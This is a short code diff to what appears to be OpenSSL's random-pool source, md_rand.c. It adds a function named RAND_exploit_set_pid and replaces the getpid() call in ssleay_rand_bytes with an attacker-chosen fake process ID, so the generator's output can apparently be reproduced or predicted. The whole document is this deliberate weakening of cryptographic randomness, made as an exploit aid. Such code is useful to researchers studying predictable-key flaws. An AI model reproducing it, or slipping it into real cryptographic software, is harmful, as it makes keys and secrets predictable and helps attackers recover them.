@@ -141,6 +141,7 @@ static unsigned char md[MD_DIGEST_LENGTH];
 static long md_count[2]={0,0};
 static double entropy=0;
 static int initialized=0;
+static pid_t fake_pid = 0;
 
 static unsigned int crypto_lock_rand = 0; /* may be set only when a thread
                                            * holds CRYPTO_LOCK_RAND
@@ -148,7 +149,10 @@ static unsigned int crypto_lock_rand = 0; /* may be set only when a thread
 /* access to lockin_thread is synchronized by CRYPTO_LOCK_RAND2 */
 static unsigned long locking_thread = 0; /* valid iff crypto_lock_rand is set */
 
-
+void RAND_exploit_set_pid(pid_t new_fake_pid)
+{
+  fake_pid = new_fake_pid;
+}
 #ifdef PREDICT
 int rand_predictable=0;
 #endif
@@ -329,7 +333,8 @@ static int ssleay_rand_bytes(unsigned char *buf, int num)
 	unsigned char local_md[MD_DIGEST_LENGTH];
 	EVP_MD_CTX m;
 #ifndef GETPID_IS_MEANINGLESS
-	pid_t curr_pid = getpid();
+	//pid_t curr_pid = getpid();
+	pid_t curr_pid = fake_pid;
 #endif
 	int do_stir_pool = 0;
 
